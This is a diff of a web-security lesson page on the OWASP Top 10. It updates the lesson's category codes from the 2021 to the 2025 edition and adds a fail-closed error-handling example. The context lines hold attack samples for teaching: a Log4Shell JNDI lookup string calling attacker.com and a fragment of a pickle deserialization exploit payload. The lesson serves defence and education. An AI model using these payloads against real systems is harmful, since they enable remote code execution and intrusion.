@@ -77,13 +77,30 @@ export default function WebAttacksOwasp() {
       <P>These are not theoretical vulnerabilities. SQL injection, Cross-Site Scripting, and Broken Access Control appear in real breaches every week. The 2021 LinkedIn data scrape (700 million records), the 2022 Optus breach (9.8 million Australians' data), and hundreds of smaller breaches each year trace back to one or more OWASP Top 10 vulnerabilities. Understanding them from first principles — not just knowing the names — is what separates a security engineer who can find and fix these issues from one who can only recite them.</P>
 
       <div style={{ background: `${C}08`, border: `1px solid ${C}25`, borderLeft: `4px solid ${C}`, borderRadius: '0 10px 10px 0', padding: '20px 24px', margin: '4px 0 28px' }}>
-        <P>This lesson covers the OWASP Top 10 (2021 edition) from the attacker's perspective: the exact conditions that create each vulnerability, how an attacker exploits it, the real-world impact, and the specific code patterns that fix it. The goal is to build the mental model that lets you recognise these vulnerabilities in code you read and write — not just in exam questions.</P>
+        <P>This lesson covers the OWASP Top 10 (2025 edition) from the attacker's perspective: the exact conditions that create each vulnerability, how an attacker exploits it, the real-world impact, and the specific code patterns that fix it. The goal is to build the mental model that lets you recognise these vulnerabilities in code you read and write — not just in exam questions.</P>
       </div>
+
+      <H>OWASP Top 10: 2025 vs 2021</H>
+      <P>OWASP published the 2025 list in late 2025. Most categories survived with new positions, so older courses, interview questions, and audit reports still use the 2021 codes. Learn both: the 2025 code is current, and the 2021 code is what you will see in existing documentation.</P>
+      <Block>{`2025 code  Category                                     2021 equivalent
+A01:2025   Broken Access Control (now includes SSRF)    A01:2021 + A10:2021 (SSRF)
+A02:2025   Security Misconfiguration                    A05:2021
+A03:2025   Software Supply Chain Failures               A06:2021 Vulnerable and Outdated Components (expanded)
+A04:2025   Cryptographic Failures                       A02:2021
+A05:2025   Injection (includes XSS)                     A03:2021
+A06:2025   Insecure Design                              A04:2021
+A07:2025   Authentication Failures                      A07:2021 Identification and Authentication Failures
+A08:2025   Software or Data Integrity Failures          A08:2021
+A09:2025   Security Logging and Alerting Failures       A09:2021 Security Logging and Monitoring Failures
+A10:2025   Mishandling of Exceptional Conditions        new in 2025
+
+Source: https://top10.owasp.org/2025/`}</Block>
+      <P>The sections below follow the attack families in a teaching order, with the 2025 code in each heading and the 2021 code in brackets where it changed.</P>
 
       <HR />
 
       {/* ── PART 02 ── */}
-      <Part n="02" title="A01 — Broken Access Control" />
+      <Part n="02" title="A01:2025 — Broken Access Control" />
 
       <P><Hl>Access control</Hl> enforces that users can only perform actions or access data that they are authorised for. Broken access control means the enforcement fails — authenticated users can access resources that belong to other users, perform administrative actions they should not, or manipulate access control mechanisms themselves.</P>
 
@@ -123,12 +140,12 @@ POST /api/register
       <H>Forced Browsing</H>
       <P>Accessing URLs or API endpoints that should be restricted but are not properly protected. An admin panel at <code style={{ fontFamily: 'var(--font-mono)', fontSize: 12, background: 'var(--bg2)', padding: '1px 5px', borderRadius: 3 }}>/admin</code> that only checks if the user is authenticated (not if they are an admin) can be accessed by any logged-in user. Vertical privilege escalation — a regular user accessing admin functionality.</P>
 
-      <ProTip>Broken access control is consistently the #1 OWASP vulnerability by occurrence rate — it appears in 94% of tested applications in some form. It is also the most impactful: access control failures lead directly to data breaches. The fix is never a clever technical mechanism — it is consistently checking authorisation on every resource access on the server side, never trusting client-supplied authorisation indicators.</ProTip>
+      <ProTip>Broken access control has been #1 in both the 2021 and 2025 OWASP lists; in the 2021 data set it appeared in 94% of tested applications in some form. It is also the most impactful: access control failures lead directly to data breaches. The fix is never a clever technical mechanism — it is consistently checking authorisation on every resource access on the server side, never trusting client-supplied authorisation indicators.</ProTip>
 
       <HR />
 
       {/* ── PART 03 ── */}
-      <Part n="03" title="A02 — Cryptographic Failures (Sensitive Data Exposure)" />
+      <Part n="03" title="A04:2025 — Cryptographic Failures (was A02:2021)" />
 
       <P>Previously called "Sensitive Data Exposure," this category covers two related failures: storing or transmitting sensitive data without adequate encryption, or using weak/broken cryptographic algorithms that provide false security.</P>
 
@@ -161,7 +178,7 @@ from cryptography.fernet import Fernet  # AES-128-CBC + HMAC — for field encry
       <HR />
 
       {/* ── PART 04 ── */}
-      <Part n="04" title="A03 — Injection (SQL Injection and Beyond)" />
+      <Part n="04" title="A05:2025 — Injection: SQL and Beyond (was A03:2021)" />
 
       <P>Injection vulnerabilities occur when untrusted user input is processed as code or a command rather than as data. SQL injection is the canonical example, but the same pattern extends to OS command injection, LDAP injection, XPath injection, and any other context where user input and execution context mix.</P>
 
@@ -214,7 +231,7 @@ result = subprocess.run(["ping", "-c", "1", host])  # host is just a string argu
       <HR />
 
       {/* ── PART 05 ── */}
-      <Part n="05" title="A04 — Insecure Design" />
+      <Part n="05" title="A06:2025 — Insecure Design (was A04:2021)" />
 
       <P>Insecure design is a category that sits above specific vulnerabilities — it represents missing or ineffective security controls at the design level. You can write perfectly implemented code that is insecurely designed. Examples include: a password reset flow that reveals whether an email exists (enabling account enumeration); a payment system that trusts client-supplied pricing; an API that returns full objects when the caller only needed one field (over-fetching sensitive data).</P>
 
@@ -238,7 +255,7 @@ POST /api/checkout {"item_id": 42, "price": 0.01}
       <HR />
 
       {/* ── PART 06 ── */}
-      <Part n="06" title="A05 — Security Misconfiguration" />
+      <Part n="06" title="A02:2025 — Security Misconfiguration (was A05:2021)" />
 
       <P>Security misconfiguration is the most broadly applicable OWASP category — it encompasses every case where a secure feature exists but is not enabled or is configured incorrectly. Default credentials, verbose error messages, open cloud storage, unnecessary features enabled, missing security headers.</P>
 
@@ -273,7 +290,7 @@ POST /api/checkout {"item_id": 42, "price": 0.01}
       <HR />
 
       {/* ── PART 07 ── */}
-      <Part n="07" title="A06 — Vulnerable and Outdated Components" />
+      <Part n="07" title="A03:2025 — Software Supply Chain Failures (was A06:2021 Vulnerable and Outdated Components)" />
 
       <P>Modern applications depend on hundreds of third-party libraries and frameworks. Each dependency is a potential vulnerability. When a critical vulnerability is discovered in a widely-used library — like Log4j's Log4Shell (CVE-2021-44228) — every application that uses that library is suddenly vulnerable.</P>
 
@@ -301,7 +318,7 @@ ${'{jndi:ldap://attacker.com/a}'}
       <HR />
 
       {/* ── PART 08 ── */}
-      <Part n="08" title="A07 — Identification and Authentication Failures" />
+      <Part n="08" title="A07:2025 — Authentication Failures" />
 
       <P>Authentication failures enable attackers to assume other users' identities. This category covers weak passwords, broken session management, credential stuffing, and implementation errors in authentication flows.</P>
 
@@ -335,7 +352,7 @@ ${'{jndi:ldap://attacker.com/a}'}
       <HR />
 
       {/* ── PART 09 ── */}
-      <Part n="09" title="A08 — Software and Data Integrity Failures" />
+      <Part n="09" title="A08:2025 — Software or Data Integrity Failures" />
 
       <P>This category covers scenarios where software, data, or dependencies are used without verifying their integrity — trusting content that could have been modified by an attacker.</P>
 
@@ -369,9 +386,9 @@ malicious = base64.b64encode(pickle.dumps(Exploit())).decode()
       <HR />
 
       {/* ── PART 10 ── */}
-      <Part n="10" title="A09 — Security Logging and Monitoring Failures" />
+      <Part n="10" title="A09:2025 — Security Logging and Alerting Failures" />
 
-      <P>This category captures an often-overlooked reality: attacks that are not detected and not investigated cause the same damage as attacks that are. The average dwell time — the time between a breach and its detection — was 204 days globally in 2022. During that time, attackers may have exfiltrated terabytes of data. The absence of logging and monitoring is what enables that dwell time.</P>
+      <P>This category captures an often-overlooked reality: attacks that are not detected and not investigated cause the same damage as attacks that are. Dwell time — the gap between a breach and its detection — is routinely measured in months, not days, in industry breach reports. During that time, attackers may have exfiltrated terabytes of data. The absence of logging and monitoring is what enables that dwell time.</P>
 
       <Block>{`# What must be logged:
 - Authentication events (success and failure, with IP and timestamp)
@@ -399,10 +416,27 @@ malicious = base64.b64encode(pickle.dumps(Exploit())).decode()
 - Session tokens or API keys
 - Full SSNs or medical record numbers`}</Block>
 
+      <H>A10:2025 — Mishandling of Exceptional Conditions</H>
+      <P>New in 2025, this category covers code that behaves unsafely when something unexpected happens: an exception that skips an authorisation check, an error page that leaks a stack trace, or a timeout that is treated as success. The safe default is to <Hl>fail closed</Hl> — when the code cannot decide, it denies.</P>
+      <Block>{`# Fails open: any error in the check lets the request through
+def can_access(user, doc):
+    try:
+        return policy_service.check(user.id, doc.id)
+    except Exception:
+        return True          # outage = everyone is authorised
+
+# Fails closed: errors deny access and are logged for investigation
+def can_access(user, doc):
+    try:
+        return policy_service.check(user.id, doc.id)
+    except Exception:
+        log.exception("policy check failed", extra={"user": user.id, "doc": doc.id})
+        return False`}</Block>
+
       <HR />
 
       {/* ── PART 11 ── */}
-      <Part n="11" title="A10 — Server-Side Request Forgery (SSRF)" />
+      <Part n="11" title="SSRF — Part of A01:2025 Broken Access Control (was A10:2021)" />
 
       <P><Hl>SSRF</Hl> occurs when a web application fetches a remote resource on behalf of the user, and an attacker can control or influence the URL that is fetched. This allows attackers to use the server as a proxy to reach internal resources — cloud metadata services, internal APIs, databases, and services that should not be reachable from the internet.</P>
 
@@ -437,6 +471,8 @@ ip = socket.gethostbyname(parsed.hostname)
 if ipaddress.ip_address(ip).is_private:
     raise ValueError("Private IP not permitted")`}</Block>
 
+      <P>OWASP 2025 folded SSRF into Broken Access Control because the root cause is the same: the server performs an action (here, a network request) that the caller was never authorised to trigger.</P>
+
       <P>SSRF is particularly dangerous in cloud environments because cloud providers expose metadata services at well-known internal IPs. The 2019 Capital One breach — which exposed 100 million customers' data — involved SSRF against the AWS metadata endpoint, obtaining IAM credentials that then accessed the S3 buckets containing customer data.</P>
 
       <HR />
@@ -444,7 +480,7 @@ if ipaddress.ip_address(ip).is_private:
       {/* ── PART 12 ── */}
       <Part n="12" title="Cross-Site Scripting (XSS) — JavaScript Injection" />
 
-      <P>XSS is technically an injection vulnerability (injection of JavaScript into web pages) and was part of earlier OWASP Top 10 lists. It remains one of the most common and impactful web vulnerabilities despite not being a standalone category in the 2021 edition. Three types exist, with different mechanics and impact:</P>
+      <P>XSS is technically an injection vulnerability (injection of JavaScript into web pages) and was part of earlier OWASP Top 10 lists. It remains one of the most common and impactful web vulnerabilities despite not being a standalone category since the 2021 edition; in 2025 it sits under A05 Injection. Three types exist, with different mechanics and impact:</P>
 
       <H>Reflected XSS</H>
       <Block>{`# The server reflects user input directly into the HTML response without encoding
@@ -648,13 +684,13 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict`}</Block>
       {/* ── Key Takeaways ── */}
       <KeyTakeaways items={[
         'The OWASP Top 10 represents the most critical and common web application vulnerability classes — not an exhaustive list of all vulnerabilities. Understanding these from first principles (why the vulnerability exists, not just what it is called) enables recognition in real code.',
-        'Broken Access Control (A01) is the most common vulnerability — present in 94% of tested applications. IDOR is the most common pattern: a user-controlled ID used to access a resource without verifying the requesting user owns it. The fix is always a server-side authorisation check on every resource access.',
-        'SQL Injection (A03) occurs when user input is concatenated into SQL queries rather than passed as parameters. The fix is parameterised queries everywhere, with zero exceptions. ORMs protect by default when used correctly; raw string formatting SQL is always vulnerable.',
-        'XSS (not a separate OWASP 2021 category but still critical) injects JavaScript into web pages. Reflected XSS requires user interaction with a malicious link. Stored XSS is served by the legitimate site to all visitors. DOM-based XSS is a client-side JavaScript vulnerability. Output encoding and Content Security Policy are the primary mitigations.',
-        'SSRF (A10) allows attackers to force the server to make HTTP requests to arbitrary URLs, reaching internal services and cloud metadata endpoints. The Capital One breach exploited SSRF to access AWS IAM credentials. Prevention requires URL allowlisting and blocking private IP ranges at request time.',
-        'Cryptographic failures (A02) include: plaintext transmission (HTTP instead of HTTPS), weak password hashing (MD5, SHA-1, SHA-256 — too fast), and deprecated algorithms (DES, ECB mode). Use AES-256-GCM for encryption, Argon2id for password hashing, and TLS 1.2+ everywhere.',
-        'Vulnerable dependencies (A06) can compromise the application through no fault of the application code. Log4Shell (CVE-2021-44228) demonstrated how a single dependency vulnerability can expose millions of applications instantly. Dependency scanning in CI/CD pipelines (Dependabot, Snyk, pip-audit) is required hygiene.',
-        'Security logging and monitoring failures (A09) enable long attacker dwell times — the average 204 days between breach and detection is primarily a logging failure. Log authentication events, authorisation failures, and sensitive data access. Never log passwords, tokens, or sensitive field values.',
+        'Broken Access Control (A01:2025) is the most common vulnerability class in both the 2021 and 2025 lists, and now includes SSRF. IDOR is the most common pattern: a user-controlled ID used to access a resource without verifying the requesting user owns it. The fix is always a server-side authorisation check on every resource access.',
+        'SQL Injection (A05:2025, was A03:2021) occurs when user input is concatenated into SQL queries rather than passed as parameters. The fix is parameterised queries everywhere, with zero exceptions. ORMs protect by default when used correctly; raw string formatting SQL is always vulnerable.',
+        'XSS (grouped under Injection since 2021, still critical) injects JavaScript into web pages. Reflected XSS requires user interaction with a malicious link. Stored XSS is served by the legitimate site to all visitors. DOM-based XSS is a client-side JavaScript vulnerability. Output encoding and Content Security Policy are the primary mitigations.',
+        'SSRF (A10:2021, merged into A01:2025) allows attackers to force the server to make HTTP requests to arbitrary URLs, reaching internal services and cloud metadata endpoints. The Capital One breach exploited SSRF to access AWS IAM credentials. Prevention requires URL allowlisting and blocking private IP ranges at request time.',
+        'Cryptographic failures (A04:2025, was A02:2021) include: plaintext transmission (HTTP instead of HTTPS), weak password hashing (MD5, SHA-1, SHA-256 — too fast), and deprecated algorithms (DES, ECB mode). Use AES-256-GCM for encryption, Argon2id for password hashing, and TLS 1.2+ everywhere.',
+        'Software supply chain failures (A03:2025, expanded from A06:2021 vulnerable components) can compromise the application through no fault of the application code. Log4Shell (CVE-2021-44228) demonstrated how a single dependency vulnerability can expose millions of applications instantly. Dependency scanning in CI/CD pipelines (Dependabot, Snyk, pip-audit) is required hygiene.',
+        'Security logging and alerting failures (A09:2025) enable long attacker dwell times — breaches that go undetected for months are primarily a logging and alerting failure. A10:2025 adds a related risk: code that fails open when an exception occurs. Log authentication events, authorisation failures, and sensitive data access. Never log passwords, tokens, or sensitive field values.',
         'Session management security: session tokens must be cryptographically random (128+ bits of entropy), server-side invalidated on logout, expired after inactivity, transmitted only over HTTPS, and HttpOnly. JWTs without server-side revocation cannot be invalidated — design accordingly.',
         'The AppSec mindset for code review: at every resource access, ask "does the server verify that this authenticated user is authorised to access this specific resource?" At every SQL query, ask "is user input parameterised?" At every HTML render, ask "is dynamic content encoded?" These three questions catch the majority of OWASP Top 10 vulnerabilities.',
       ]} />
